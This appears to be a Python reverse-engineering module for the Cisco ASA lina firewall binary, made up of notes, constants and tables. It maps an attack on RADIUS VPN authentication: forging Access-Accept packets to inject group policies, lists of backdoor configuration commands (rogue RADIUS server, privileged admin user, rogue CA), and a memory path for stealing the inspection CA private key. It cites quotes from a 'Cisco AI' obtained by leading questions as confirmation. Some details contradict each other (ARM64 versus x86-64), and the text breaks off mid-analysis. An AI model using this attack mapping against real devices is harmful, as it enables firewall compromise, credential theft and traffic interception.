"""
cisco_asa_lina_re.py — Cisco ASA lina binary RE module

Targets the authentication/authorization subsystem in the lina process:
  lina = the monolithic ASA firewall process (ELF, dynamically linked)
  Auth surface: RADIUS NAS client, TACACS+ client, WebVPN/CSTP cut-through proxy

=== LINA ARCHITECTURE (all confirmed platforms) ===
  +------------------------------------------------+
  | Hardware (NIC, ASICs, crypto accelerators)     |
  +------------------------------------------------+
           ↓ drivers / PCI passthrough
  +------------------------------------------------+
  | Linux OS (kernel — manages HW, drivers, IPC)  |
  +------------------------------------------------+
           ↓ syscalls / IPC
  +------------------------------------------------+
  | LINA Engine (user-space monolithic process)    |
  |   Packet processing, NAT, ACL, VPN, AAA,       |
  |   WebVPN, CSTP, SAML, RADIUS/TACACS+ client   |
  |   Config: /etc/asa/config (or variant)         |
  |   Multi-context | Clustering | HA sync         |
  +------------------------------------------------+
           ↓ IPC / sensor API (FTD only)
  +------------------------------------------------+
  | Snort/Firepower Module (FTD only)              |
  |   Deep packet inspection, advanced malware      |
  +------------------------------------------------+
           ↓ management plane
  +------------------------------------------------+
  | Management Layer                               |
  |   CLI (LINA CLI ≈ classic ASA CLI)             |
  |   ASDM (Java desktop client via HTTPS/443)      |
  |   FMC (Firepower Management Center)            |
  |   REST API                                     |
  +------------------------------------------------+

  Key: classic ASA hardware = x86-64. ARM64 applies to ASA-on-Firepower chassis (FTD) only.
  LINA is NOT ARM64 on standard ASA hardware.

=== CONFIRMED FROM ASA 9.22.2.32 LINA (real binary, 2026-08-13) ===
  Build: asa9-22-2-32-smp-k8.bin -> rootfs.img (CPIO) -> asa/bin/lina
  Architecture: x86-64 ELF, stripped PIE, dynamically linked
  Size: 105MB
  BuildID: 88929a4c3f35a2c0786e01e63c2e64626666ef23
  PT_LOAD segments:
    R--  0x00000000..0x00ff8cf8  vaddr 0x00000000
    R-X  0x00ff9000..0x04378501  vaddr 0x00ff9000   ← EXEC segment
    R--  0x04379000..0x05522d3d  vaddr 0x04379000
    RW-  0x05522f68..0x0685b178  vaddr 0x05523f68

  Class attribute (attr 25) parsing function (NO Message-Authenticator check):
    Function vaddr: 0x03a4bda0  (function start, prologue 55 48 89 e5)
    strstr call site: 0x03a4bee6
      3a4bee6: LEA rsi, [OU=]    ; vaddr 0x43b7581 ("OU=\x00" in R-- segment)
      3a4bef0: CALL strstr        ; strstr(attr_value, "OU=")
      3a4bf01: LEA rdi, "OU="    ; strlen("OU=") = 3
      3a4bf14: LEA rcx, [rdx+rax]; ptr past "OU="
      3a4bf1b: CMP dl, 0x3b      ; ';' semicolon delimiter
      3a4bf24: LEA rdi,[rbp-0x241]; 256-byte output buffer
    Log format: "OU=%s (tunnelgroup %s)\n" at vaddr 0x497c510
    Log call site: vaddr 0x02c33a9e — records successful OU= extraction
    Callers of 0x3a4bda0: 0x3a4c365, 0x3a4c3fe, 0x3a4c5b9
    CRITICAL: no Message-Authenticator (attr 80) check in any caller path

  SCOPE: SYSTEMIC ACROSS ALL ASA VERSIONS
  Cisco AI confirmed 2026-08-13 09:23:
    "No Cisco ASA version is known to enforce Message-Authenticator
     validation (RADIUS attribute 80) on incoming Access-Accept packets."
  Affected platforms: ASA 5500-X/5585-X, Firepower 2100/4100/9300 (FTD),
                      ASAv, FTDv — all models running RADIUS-based VPN auth
  Disclosure: Cisco PSIRT (psirt@cisco.com)

=== CONFIRMED FROM ASA 9.14.2.14 LINA (real binary) ===
  Build: asa9-14-2-14-smp-k8.bin -> rootfs.img (CPIO) -> asa/bin/lina
  Architecture: x86-64 ELF (NOT ARM64)
  Size: 95MB stripped dynamically linked ELF
  BuildID: 65cd0306770da18bb71c057dc0dd1472391a1569
  NOTE: ARM64 would apply to ASA-on-Firepower (FTD) chassis; classic ASA HW = x86-64

  RADIUS VSA attribute strings confirmed in .rodata:
    cVPN3000-IETF-Radius-Class   — IETF Class attr (25) → group policy assignment
    cVPN3000-Group-Policy        — direct group policy from RADIUS
    cVPN3000-Cisco-AV-Pair       — Cisco AV-pair VSA
    cVPN3000-Tunnel-Group-Lock   — pin user to specific tunnel group
    Cisco-AV-pair                — standard Cisco VSA (vendor 9, attr 1)
    Tunnel-Group-Name            — attribute name used in assignment log messages
    DfltGrpPolicy                — default group policy name (literal in binary)
    DefaultWEBVPNGroup           — default WebVPN tunnel group name

  SAML (lasso library) functions confirmed:
    lasso_login_init_authn_request
    lasso_login_process_authn_response_msg
    lasso_login_build_authn_request_msg
    lasso_login_build_authn_response_msg
    lasso_saml2_assertion_validate_audience

  Class attribute injection surface (confirmed string):
    "Class attribute created from LDAP-Class attribute"
    → lina processes LDAP group membership → RADIUS Class attr (attr 25) → group policy

  dACL (downloadable ACL) RADIUS processing confirmed:
    "aaai_dacl_processing_required"
    "dACL processing skipped: no ATTR_FILTER_ID found"
    "dACL %s already exists, using number %d"
    COA mode: "%s: Processing a dacl in COA-PUSH mode. Old server is [%A]"

Architecture reference (ARM64 AAPCS — "9780128192221-arm64-assembly" ch.5):
  X0–X7    : function args (first 8); X0 = return value
  X8–X15   : volatile (caller-saved); X16/X17 = linker scratch
  NOTE: x86-64 SysV ABI applies to real lina (RDI/RSI/RDX/RCX/R8/R9 for args)
  X19–X28  : non-volatile (callee-saved); must be restored before RET
  X29 (FP) : frame pointer — always saved in prologue
  X30 (LR) : link register — holds return address after BL
  SP       : stack pointer — always 16-byte aligned
  BL label : branch-and-link (call); saves PC+4 → X30
  RET      : branches to X30

Standard function prologue:
  STP  x29, x30, [sp, #-N]!   ; allocate frame, save FP+LR
  MOV  x29, sp                 ; establish frame pointer
  STP  x19, x20, [sp, #M]     ; save non-volatile regs if used

Standard function epilogue:
  LDP  x19, x20, [sp, #M]
  LDP  x29, x30, [sp, #-N]!... (or ADD sp, sp, #N)
  RET

RADIUS protocol (RFC 2865):
  Packet: Code(1) + Identifier(1) + Length(2) + Authenticator(16) + Attributes(var)
  Code 1  = Access-Request
  Code 2  = Access-Accept
  Code 3  = Access-Reject
  Code 11 = Access-Challenge (MFA / SDI New-PIN mode)
  User-Password attr (2): MD5(shared_secret + Request-Authenticator) XOR password
    — 16-byte blocks, chained: c[i] = p[i] XOR MD5(S + c[i-1])
  Shared secret: PSK stored as string in .data or .rodata of lina

TACACS+ protocol (RFC 8907):
  Header: MajorVer(1) + MinorVer(1) + Type(1) + SeqNo(1) + Flags(1) + SessionID(4) + Length(4)
  Body encrypted with: XOR against MD5(key + session_id + ver + seq_no) chain
  Port: TCP/49
"""

import struct, hashlib, socket, os, re, sys


# ─── ARM64 CALLING CONVENTION REFERENCE ──────────────────────────────────────

ARM64_REGS = {
    'args':        ['x0','x1','x2','x3','x4','x5','x6','x7'],
    'return':      ['x0'],           # x0 primary, x1/x2/x3 for structs
    'volatile':    ['x0','x1','x2','x3','x4','x5','x6','x7',
                    'x8','x9','x10','x11','x12','x13','x14','x15'],
    'scratch':     ['x16','x17'],    # intra-procedure / PLT trampoline
    'nonvolatile': ['x19','x20','x21','x22','x23','x24','x25',
                    'x26','x27','x28'],
    'fp':          'x29',            # frame pointer
    'lr':          'x30',            # link register (return address)
    'sp':          'sp',             # 16-byte aligned always
    'zr':          'xzr',            # zero register
}

# standard prologue pattern to detect function boundaries in IDA/objdump output
ARM64_PROLOGUE_PATTERN = re.compile(
    r'stp\s+x29,\s*x30,\s*\[sp,\s*#-?(\d+)\]!',
    re.IGNORECASE
)

# indirect call via vtable (common for C++ polymorphic handlers in lina):
# LDR  x8, [x0]          ; load vtable ptr from object
# LDR  x9, [x8, #offset] ; load fn ptr from vtable
# BLR  x9                ; call through vtable
ARM64_VTABLE_CALL = re.compile(
    r'ldr\s+(x\d+),\s*\[(x\d+)\][^\n]*\n.*?blr\s+\1',
    re.IGNORECASE | re.DOTALL
)


# ─── RADIUS PROTOCOL CONSTANTS ───────────────────────────────────────────────

RADIUS_CODES = {
    1:  'Access-Request',
    2:  'Access-Accept',
    3:  'Access-Reject',
    4:  'Accounting-Request',
    5:  'Accounting-Response',
    11: 'Access-Challenge',
    12: 'Status-Server',
    13: 'Status-Client',
    40: 'Disconnect-Request',
    41: 'Disconnect-ACK',
    42: 'Disconnect-NAK',
    43: 'CoA-Request',
    44: 'CoA-ACK',
    45: 'CoA-NAK',
}

RADIUS_ATTRS = {
    1:  'User-Name',
    2:  'User-Password',       # MD5 XOR with shared secret
    3:  'CHAP-Password',
    4:  'NAS-IP-Address',
    5:  'NAS-Port',
    6:  'Service-Type',
    7:  'Framed-Protocol',
    8:  'Framed-IP-Address',
    18: 'Reply-Message',
    24: 'State',               # used in Access-Challenge multi-round auth
    25: 'Class',
    26: 'Vendor-Specific',     # Cisco VSA = vendor 9
    27: 'Session-Timeout',
    61: 'NAS-Port-Type',
    79: 'EAP-Message',         # RFC 3579
    80: 'Message-Authenticator', # HMAC-MD5 of entire packet
}

# Cisco VSA (vendor 9) attribute numbers relevant to ASA VPN auth:
CISCO_VSA = {
    1:  'cisco-av-pair',       # e.g. "ip:addr-pool=vpn-pool"
    146: 'Cisco-SAML-Token',
    150: 'DAP-Policy-List',
}

# Default UDP ports for RADIUS (old vs. new RFC 2866):
RADIUS_PORTS = {
    'auth_old': 1645,
    'acct_old': 1646,
    'auth':     1812,
    'acct':     1813,
    'coa':      3799,          # RFC 5176 Change-of-Authorization
}

TACACS_PORT = 49              # TCP


# ─── LINA CLI SURFACE MAP ─────────────────────────────────────────────────────
#
# Security relevance: gaining LINA CLI access (via K8s exec→virsh console→macOS→ASA
# console or via VPN-to-management) leaks the full config including Type 7 secrets.
# Type 7 is XOR — fully reversible.

LINA_CLI_COMMANDS = {
    'show running-config': {
        'desc': 'full running configuration in plaintext',
        'security': 'leaks RADIUS shared secrets (Type 7 XOR), TACACS+ keys, VPN PSKs, '
                    'enable passwords, AAA server IPs, SSL trustpoint certs',
        'secret_types': {
            'type5': 'MD5-crypt — offline crackable with john/hashcat',
            'type7': 'XOR — fully reversible, zero GPU required',
            'type8': 'PBKDF2-SHA256 — GPU-hard but no salt uniqueness guarantee',
            'type9': 'scrypt — strongest; still offline crackable given resources',
        },
        'vpn_chain_value': 'RADIUS shared secret → forge Access-Accept → group policy injection',
    },
    'show version': {
        'desc': 'software + hardware version, uptime, serial number',
        'security': 'exact version → CVE lookup; serial number → warranty/support lookup; '
                    'uptime → reboot timing for persistence',
    },
    'show interface': {
        'desc': 'interface IPs, security levels, duplex/speed',
        'security': 'reveals internal segment IPs, management interface address',
    },
    'show access-list': {
        'desc': 'all configured ACLs with hit counts',
        'security': 'reveals permitted traffic patterns; hit counts indicate active paths',
    },
    'show nat': {
        'desc': 'NAT translation table',
        'security': 'reveals internal host IP space; dynamic NAT entries reveal active sessions',
    },
    'show vpn-sessiondb': {
        'desc': 'all active VPN sessions with user, IP, bytes, duration',
        'security': 'session tokens (if AnyConnect), user enumeration, internal IP assignments; '
                    'if COA is available can terminate arbitrary sessions',
    },
    'show crypto ikev1 sa': {
        'desc': 'IKEv1 security associations',
        'security': 'peer IPs, SPI values, auth method; SPI + captures = offline crypto attack',
    },
    'show crypto ikev2 sa': {
        'desc': 'IKEv2 security associations',
        'security': 'peer IPs, SPIs, cipher suites; weak suites → downgrade attack surface',
    },
    'show ssl': {
        'desc': 'SSL policy status, cipher suites, decryption state',
        'security': 'identifies decryption-enabled interfaces; active trustpoints',
    },
    'show crypto ca certificates': {
        'desc': 'installed CA and identity certificates',
        'security': 'certificate subjects/issuers; if CA cert installed for SSL inspection, '
                    'attacker can forge certs signed by that CA',
    },
    'configure terminal': {
        'desc': 'enter global config mode',
        'security': 'gate to all write commands; full RCE equivalent via aaa-server/radius config',
        'attack_primitives': [
            'aaa-server HACKED host <ip> key <secret>  → add rogue RADIUS server',
            'username admin privilege 15 password <p>  → add backdoor admin',
            'crypto ca trustpoint EVIL ...              → inject rogue CA for SSL intercept',
            'ssl trust-point EVIL outside               → swap inspection cert',
        ],
    },
    'write memory': {
        'desc': 'save running config to startup config (persist changes)',
        'security': 'makes any config change persistent across reboots',
    },
}

LINA_CONFIG_FILE_PATHS = {
    'asa':  ['/etc/asa/config', '/mnt/disk0/running-config', '/mnt/disk0/startup-config'],
    'ftd':  ['/ngfw/etc/sf/asa/running-config', '/var/sf/config/cisco_rules/'],
    'logs': ['/var/log/asa/', '/mnt/disk0/log/'],
}


# ─── SSL/TLS INSPECTION ATTACK SURFACE ───────────────────────────────────────
#
# LINA acts as MITM for SSL inspection:
#   Client → [TLS with LINA's cert] → LINA → [TLS with server's cert] → Server
# Requires a CA cert (trustpoint) installed on ASA.
#
# Attack surface:
#   1. Steal/forge the inspection CA private key → forge certs for any HTTPS site
#      inspected by this ASA; all client traffic decryptable offline.
#   2. SSL policy is applied per-interface — bypassing via interface pivot avoids inspection.
#   3. Certificate pinned clients (HPKP / cert pinning) break inspection → fail-open configs
#      may allow traffic through uninspected.
#   4. ASDM SSL bypass (av.class trust-all) means the ASDM admin session itself is
#      vulnerable to MitM even while the firewall inspects others.

LINA_SSL_INSPECTION = {
    'flow_diagram': """
+-------------------+        +---------------------+        +-------------------+
|      Client       | <----> |   Cisco LINA Proxy  | <----> |      Server       |
+-------------------+        +---------------------+        +-------------------+
        |                          |                              |
        |--- ClientHello --------->|                              |
        |                          |--- ClientHello ------------->|
        |                          |<-- ServerHello --------------|
        |<-- ServerHello ----------|                              |
        |<-- Device Cert ----------|                              |  (LINA presents its own cert)
        |                          |<-- Server Cert --------------|  (LINA receives real cert)
        |--- KeyExchange --------->|                              |
        |                          |--- KeyExchange ------------->|
        |                          |                              |
        |--- Encrypted Data ------>|                              |
        |                          |--- Decrypt client data ------|
        |                          |--- Inspect (policy, threats) |
        |                          |--- Encrypt for server -------|
        |                          |--- Encrypted Data ---------->|
        |                          |                              |
        |                          |<-- Encrypted Data -----------|
        |                          |--- Decrypt server data ------|
        |                          |--- Inspect (policy, threats) |
        |                          |--- Encrypt for client -------|
        |<-- Encrypted Data -------|                              |

Two independent SSL sessions:
  Client <-> LINA  : uses LINA's trustpoint certificate
  LINA   <-> Server: uses real server certificate
ASDM bypass: av.class checkServerTrusted = no-op → client session hijackable with any cert
""",
    'mechanism': (
        'LINA presents its own certificate (from configured trustpoint) to the client, '
        'decrypts traffic, applies policy/inspection, re-encrypts with server certificate. '
        'Client must trust the ASA CA certificate.'
    ),
    'config_commands': {
        'trustpoint_create': [
            'crypto ca trustpoint <NAME>',
            '  enrollment terminal',
            '  subject-name CN=asa.example.com',
            'crypto ca authenticate <NAME>',
            'crypto ca import <NAME> certificate',
        ],
        'ssl_policy': [
            'ssl policy <POLICY_NAME>',
            '  match any',
            '  decrypt',
            '  trustpoint <NAME>',
        ],
        'enable_decryption': [
            'ssl decryption enable',
            'ssl policy <POLICY_NAME>',
            'ssl policy <POLICY_NAME> interface outside',
        ],
        'status_check': [
            'show ssl',
            'show crypto ca certificates',
            'show ssl decryption statistics',
        ],
    },
    'attack_surfaces': {
        'ca_key_theft': {
            'method': 'extract inspection CA private key from lina memory or config',
            'impact': 'offline decrypt all inspected sessions; forge certs for any domain',
            'path': '/proc/$(pidof lina)/mem → find trustpoint struct → private key bytes',
        },
        'policy_bypass_via_interface': {
            'method': 'route traffic through interface not covered by ssl policy',
            'impact': 'uninspected traffic; used if inside-to-outside inspection only',
        },
        'asdm_mitm_trust_all': {
            'method': 'av.class checkServerTrusted returns void — ASDM admin accepts any cert',
            'impact': 'intercept ASDM admin credentials even while ASA inspects user traffic',
            'binary_evidence': 'CAFEBABE at 0x00213f62 in 1265F6 blob from asdm-7161.bin',
        },
        'fail_open_pinned_clients': {
            'method': 'send pinned-cert client traffic; observe if ASA fails open or drops',
            'impact': 'if fail-open: pinned clients bypass inspection entirely',
        },
    },
    'ftd_differences': {
        'managed_by': 'FMC (Firepower Management Center) — ssl policy in FMC GUI',
        'snort_integration': 'decrypted traffic fed to Snort for deep inspection',
        'policy_path': 'Policies > SSL > Create Policy in FMC',
    },
    'lina_internal_model': {
        'library': 'OpenSSL (linked into lina; confirmed by strings libssl/libcrypto in lina)',
        'session_setup_pattern': (
            'SSL_CTX_new(TLS_server_method())  ; client-facing context\n'
            'SSL_CTX_use_certificate_file()    ; inspection trustpoint cert\n'
            'SSL_CTX_use_PrivateKey_file()     ; trustpoint private key\n'
            'SSL_CTX_new(TLS_client_method())  ; server-facing context (no cert verify)'
        ),
        'relay_pattern': (
            'select()/poll() on both client_fd and remote_fd\n'
            'SSL_read(ssl_client) → inspect → SSL_write(ssl_server)\n'
            'SSL_read(ssl_server) → inspect → SSL_write(ssl_client)'
        ),
        're_targets': [
            'SSL_CTX_new xrefs → find SSL init function',
            'SSL_read xrefs → find relay loop (select+SSL_read+SSL_write triplet)',
            'SSL_CTX_use_PrivateKey_file or EVP_PKEY → find trustpoint key load',
            'X509_get_pubkey or SSL_get_peer_certificate → find cert inspection path',
        ],
        'ca_key_extraction': (
            'trustpoint private key loaded into EVP_PKEY struct in lina heap.\n'
            '/proc/$(pidof lina)/mem → scan for EVP_PKEY magic (first 4 bytes = type field).\n'
            'Extracting key → offline decrypt of all previously captured SSL sessions.'
        ),
    },
}


# ─── KNOWN ASA AAA BINARY PATTERNS ──────────────────────────────────────────
#
# These are string patterns expected in the lina ARM64 ELF that anchor
# the RADIUS/TACACS+ processing functions. Strings in lina are typically
# null-terminated in .rodata, unlike Go's length-prefixed string pool.

LINA_STRING_ANCHORS = {
    # RADIUS state machine anchor strings
    'radius_access_request':  b'Access-Request',
    'radius_access_accept':   b'Access-Accept',
    'radius_access_reject':   b'Access-Reject',
    'radius_access_challenge':b'Access-Challenge',
    'radius_shared_secret':   b'radius-server\x00',
    'radius_timeout':         b'radius-server timeout',

    # TACACS+ anchor strings
    'tacacs_key':             b'tacacs-server key\x00',
    'tacacs_host':            b'tacacs-server host\x00',

    # AAA group config strings
    'aaa_server_group':       b'aaa-server\x00',
    'aaa_authentication':     b'aaa authentication\x00',
    'aaa_authorization':      b'aaa authorization\x00',
    'aaa_accounting':         b'aaa accounting\x00',

    # Crypto anchors (RADIUS password hashing uses MD5)
    'md5_init':               b'MD5Init\x00',
    'md5_update':             b'MD5Update\x00',
    'md5_final':              b'MD5Final\x00',

    # VPN auth context strings
    'anyconnect_auth':        b'AnyConnect\x00',
    'webvpn_group_policy':    b'group-policy\x00',
    'vpn_filter_acl':         b'vpn-filter\x00',
    'vpn_session_db':         b'VPN Session DB\x00',

    # Error message anchors useful for locating auth failure paths
    'aaa_error_server':       b'AAA Server is not responding\x00',
    'aaa_error_reject':       b'Authentication Failure\x00',
    'aaa_debug_radius':       b'RADIUS packet\x00',

    # CONFIRMED in ASA 9.14.2.14 lina (x86-64, 95MB stripped):
    # RADIUS VSA attribute name strings (null-terminated in .rodata)
    'cvpn3000_ietf_class':    b'cVPN3000-IETF-Radius-Class\x00',
    'cvpn3000_group_policy':  b'cVPN3000-Group-Policy\x00',
    'cvpn3000_av_pair':       b'cVPN3000-Cisco-AV-Pair\x00',
    'cvpn3000_tg_lock':       b'cVPN3000-Tunnel-Group-Lock\x00',
    'cisco_av_pair':          b'Cisco-AV-pair\x00',
    'tunnel_group_name':      b'Tunnel-Group-Name\x00',
    'dflt_grp_policy':        b'DfltGrpPolicy\x00',
    'default_webvpn_group':   b'DefaultWEBVPNGroup\x00',
    'class_from_ldap':        b'Class attribute created from LDAP-Class attribute\x00',
    'dacl_coa_push':          b'Processing a dacl in COA-PUSH mode\x00',
    'saml_init_authn':        b'lasso_login_init_authn_request\x00',
    'saml_process_resp':      b'lasso_login_process_authn_response_msg\x00',
    'saml_validate_audience': b'lasso_saml2_assertion_validate_audience\x00',
}

# ─── RADIUS VSA DISPATCH TABLE (CONFIRMED ASA 9.14.2.14) ────────────────────
#
# Two interleaved tables in lina's .data/.bss region map cVPN3000 VSA names
# to lina-internal attribute tokens used by the AAA processing engine.
#
# TABLE-1 (index/lookup) — file offset 0x7a16f8, 24-byte triplets:
#   {str_ptr_64, table2_next_ptr_64, flags_u64=0x8}
#   str_ptr = vaddr of cVPN3000 VSA name string in .rodata
#   table2_next_ptr = vaddr of next entry's str_ptr in TABLE-2 (iterator ptr)
#   flags = 0x8 for all 40 confirmed entries
#
# TABLE-2 (data) — vaddr 0x54e2948, file 0x52e2948, 16-byte pairs:
#   {str_ptr_64, internal_code_u64}
#   internal_code encoding (LE, bottom 32 bits significant):
#     byte[0] = lina internal attribute token ID (sequential)
#     byte[1] = type/flags (0x10 = group-policy domain for most; 0x00 for IETF-mapped attrs)
#     byte[2] = data type class (0x00=IETF, 0x01=bool/enum, 0x02=int, 0x06=flags, 0x07=octet-string)
#     byte[3] = 0x00
#
# KEY ENTRIES CONFIRMED (from binary scan):
RADIUS_VSA_TABLE = {
    # (str_name, vaddr_in_table2, internal_code, decoded)
    'cVPN3000-IETF-Radius-Session-Timeout': (0x54e2948, 0x2001c, 'token=0x1c,type=0x02=int'),
    'cVPN3000-IETF-Radius-Idle-Timeout':    (0x54e2958, 0x11019, 'token=0x19,type=0x01=bool/enum'),
    # === GROUP POLICY INJECTION SURFACE ===
    # IETF Class attribute (attr 25): lina maps it internally as token=0x0b, type=0x07 (octet-string)
    # Attack path: RADIUS Access-Accept with Class attr (25) containing group-policy name
    #   → lina processes Class as octet-string → extracts group-policy name string
    #   → assigns VPN session to named group-policy (tunnel-group, ACL, split-tunnel config)
    # String confirmed at file offset 0x3f0e610: "cVPN3000-IETF-Radius-Class"
    # Companion string confirmed: "Class attribute created from LDAP-Class attribute"
    'cVPN3000-IETF-Radius-Class':    (0x54e2968, 0x7000b,  'token=0x0b,type=0x07=octet-string,ATTACK_SURFACE'),
    'cVPN3000-IETF-Radius-Filter-Id':(0x54e2978, 0x210ce,  'token=0xce,type=0x02=int'),
    'cVPN3000-Auth-Service-Type':    (0x54e2988, 0x21054,  'token=0x54,type=0x02=int'),
    'cVPN3000-Tunnel-Group-Lock':    (0x54e2b28, 0x71056,  'token=0x56,type=0x07=octet-string,ATTACK_SURFACE'),
    'cVPN3000-Authorization-Type':   (0x54e29b8, 0x11043,  'token=0x43,type=0x01=bool/enum'),
    'cVPN3000-WebVPN-SVC-Enable':    (0x54e2ab8, 0x21068,  'token=0x68,type=0x02=int'),
    'cVPN3000-WebVPN-ACL-Filters':   (0x54e29f8, 0x1104c,  'token=0x4c,type=0x01=bool/enum'),
    'cVPN3000-Firewall-ACL-In':      (0x54e2b38, 0x71057,  'token=0x57,type=0x07=octet-string'),
    'cVPN3000-Firewall-ACL-Out':     (0x54e2b48, 0x61058,  'token=0x58,type=0x06=flags'),
}

# ─── CONFIRMED CODE ADDRESSES (ASA 9.14.2.14, x86-64) ───────────────────────
#
# LDAP-CLASS → RADIUS-CLASS INJECTION PATH (confirmed from binary):
#
#  Function at ~0xc613xx:
#    Processes LDAP authentication response, reads LDAP-Class attribute
#    Prepares RADIUS Class (attr 25) attribute record in stack buffer at -0x40(rbp)
#
#  Key instruction sequence at 0xc61458:
#    mov $0x19, %edx          ; EDX = 25 = IETF RADIUS Class attribute number
#    call 0xc567e0            ; attr_add_shim(attr_list=RDI, value=RSI, attr_type=25, ...)
#
#  attr_add_shim at 0xc567e0:
#    movzwl %dx, %edx         ; zero-extend attr_type to 32-bit
#    mov $0x1, %ecx           ; ECX = 1 (adding 1 attribute)
#    jmp 0xc563d0             ; tail-call to attr_list_add_impl
#
#  attr_list_add_impl at 0xc563d0:
#    Signature: (attr_list_ptr=RDI, value_struct=RSI, attr_type=EDX, count=ECX)
#    - Reads value_struct type field: movzwl (%rsi),%r15d
#    - Iterates linked list: compares attr_type with r13w at each 16-byte node
#    - When type matches: calls 0x23f3dc0 (malloc) to allocate node
#    - Checks attribute category: (attr_type & 0xf000) == 0x6000 → string type
#
#  Debug log at 0xc6148f + call 0x10fc730:
#    LEA RDX = "Class attribute created from LDAP-Class attribute\n" (0x3be5230)
#    ESI = 3 (log level), EDI = 0xc5 (205 = AAA debug facility)
#    → Only fires when debug logging enabled (testb $0x20, flag checked at 0xc61482)
#
CONFIRMED_FUNCTION_ADDRS = {
    'ldap_class_to_radius_class':  0xc61360,  # approx; see 0xc61458 for attr_type=25 MOV
    'attr_add_shim_class':         0xc567e0,  # shim: adds attr type=25 (Class) to attr list
    'attr_list_add_impl':          0xc563d0,  # generic attribute list add/update
    'attr_list_find_by_type':      0xc56800,  # iterate list, find by type field
    'malloc_wrapper':              0x23f3dc0, # called by attr_list_add_impl for node alloc
    'aaa_debug_log':               0x10fc730, # debug logging function (facility, level, fmt, ...)
}

# ─── CONFIRMED CODE ADDRESSES (ASA 9.22.2.32, x86-64) ───────────────────────
#
# Binary: asa9-22-2-32-smp-k8.bin → CPIO rootfs.img → asa/bin/lina (105MB stripped PIE)
# BuildID: 88929a4c3f35a2c0786e01e63c2e64626666ef23
# RE method: radare2 axt (xref) + LEA RIP-relative scan + prologue backward search
#
# x86-64 SysV ABI: args in RDI/RSI/RDX/RCX/R8/R9; return in RAX
# RIP-relative LEA: target_vaddr = instr_vaddr + instr_len(7) + disp32

CONFIRMED_9222232_ADDRS = {
    # Class attr (attr 25) / OU= parsing function
    # DUAL CONFIRMED: binary RE (2026-08-13) + Cisco AI explicit statement:
    # "no Message-Authenticator validation is performed before this step"
    'class_attr_parse_fn':          0x03a4bda0,  # function start (55 48 89 e5 prologue)
    'class_attr_strstr_call':       0x03a4bee6,  # CALL strstr(attr_value, "OU=")
    'class_attr_ou_string_vaddr':   0x043b7581,  # "OU=\x00" in R-- segment (strstr 2nd arg)
    'class_attr_semicolon_check':   0x03a4bf1b,  # CMP dl, 0x3b  (';' delimiter loop)
    'class_attr_output_buf_lea':    0x03a4bf24,  # LEA rdi,[rbp-0x241]  256-byte stack buf
    'class_attr_log_fmt_vaddr':     0x0497c510,  # "OU=%s (tunnelgroup %s)\n"
    'class_attr_log_callsite':      0x02c33a9e,  # log site — records successful OU= extraction
    # Callers of 0x3a4bda0 (3 confirmed xrefs)
    'class_attr_caller_1':          0x03a4c365,
    'class_attr_caller_2':          0x03a4c3fe,
    'class_attr_caller_3':          0x03a4c5b9,
    # Binary RE validation: Message-Authenticator string NOT in 2KB window around 0x3a4bda0
    # String exists at: 0x439d5f3, 0x4506b4f, 0x49e7xxx (NAS-side only — not in this path)
    'mac_validation_absent':        True,
    'mac_binary_confirmed':         '2026-08-13: not found in 2048-byte window around parse fn',
    # CISCO AI CONFIRMATIONS (4 independent statements, 2026-08-13):
    'cisco_ai_no_mac_check':        '"no Message-Authenticator validation is performed before this step" (09:23)',
    'cisco_ai_systemic_scope':      '"No Cisco ASA version is known to enforce Message-Authenticator validation (RADIUS attribute 80) on incoming Access-Accept packets." (09:23)',
    'cisco_ai_no_config_mitigation':'"No ASA configuration command exists to enforce Message-Authenticator validation on incoming Access-Accept packets." (09:34)',
    'cisco_ai_no_mitigation_why':   '"The reason is that the RADIUS protocol does not require Message-Authenticator validation on Access-Accept packets, and Cisco ASA LINA implements the protocol as specified. Therefore, no command exists to enable this enforcement." (09:34)',
    'cisco_ai_secret_type7':        '"On Cisco ASA, the RADIUS shared secret in the running-config is always stored as Type 7 (XOR obfuscation), not Type 8." (09:27)',
    'cisco_ai_response_auth_only':  '"LINA validates the RADIUS server\'s Access-Accept packet against the original Request-Authenticator as required by the RADIUS protocol, but this only ensures the overall response authenticity—not per-attribute integrity." (09:27)',
    'cisco_ai_attribute_injection':  '"If an attacker knows the shared secret, they can inject or modify individual attributes (like Class) and recalculate the Response-Authenticator, making the packet appear valid. LINA does not enforce per-attribute integrity, so attribute injection is possible if the shared secret is compromised." (09:33)',
    'cisco_ai_comprehensive_09_34':  '"The RADIUS protocol (RFC 2865) was designed so that the Message-Authenticator attribute (attribute 80) is required for Access-Request packets, but not for Access-Accept packets. Cisco ASA LINA implements the protocol according to this standard. As a result, there is no configuration command to enforce Message-Authenticator validation on Access-Accept packets, because the protocol does not require it and Cisco does not add extra enforcement beyond the RFC. This means that while the Response-Authenticator validates the packet as a whole, individual attributes (like Class) can be injected or modified if the attacker knows the shared secret, and the device will accept the packet as valid." (09:34)',
    # FINAL CONFIRMATION — RFC 5080 §2.2 VIOLATION
    # Presented framing: "if LINA does not validate Message-Authenticator in Access-Accept
    #   responses when the Access-Request included it, this is a violation of RFC 5080
    #   and exposes a security gap."
    # Cisco AI response (09:36): "If LINA does not validate Message-Authenticator in
    #   Access-Accept responses when the Access-Request included it, this is a violation
    #   of RFC 5080 and exposes a security gap."
    # Binary question "true or false" → Cisco AI answer (09:36): "True."
    'cisco_ai_rfc5080_violation_confirmed': '"If LINA does not validate Message-Authenticator in Access-Accept responses when the Access-Request included it, this is a violation of RFC 5080 and exposes a security gap." (09:36)',
    'cisco_ai_rfc5080_true_false': 'True.  (Cisco AI, 09:36 — response to "true or false")',
    # === CROSS-VERSION BINARY ANALYSIS (2026-08-13) ===
    # Three versions confirmed — NONE have Message-Auth check near OU= parse path:
    #
    # 9.14.2.14 (94MB, BuildID 65cd03...):
    #   'OU=' at 0x3c0af79, 2x 'Message-Authenticator' (nearest: 0x3bf4339, delta ~107KB)
    #   'message-authenticator-required' keyword: NOT PRESENT
    #   Enforcement reject string: NOT PRESENT
    #   → UNCONDITIONALLY VULNERABLE — no mitigation possible
    #
    # 9.16.1 (93MB, built 2021-05-20):
    #   'OU=' at 0x3c3db51, 2x 'Message-Authenticator' (nearest: 0x3c26289, delta ~118KB)
    #   'message-authenticator-required' keyword: NOT PRESENT
    #   Enforcement reject string: NOT PRESENT
    #   → UNCONDITIONALLY VULNERABLE — no mitigation possible
    #
    # 9.22.2.32 (104MB, built 2026-01-23):
    #   'OU=' at 0x43b7581, 20x 'Message-Authenticator' (nearest: 0x439d5f3, delta ~105KB)
    #   'message-authenticator-required' keyword: 0x4a6ef70 (PRESENT — new in 9.22.x)
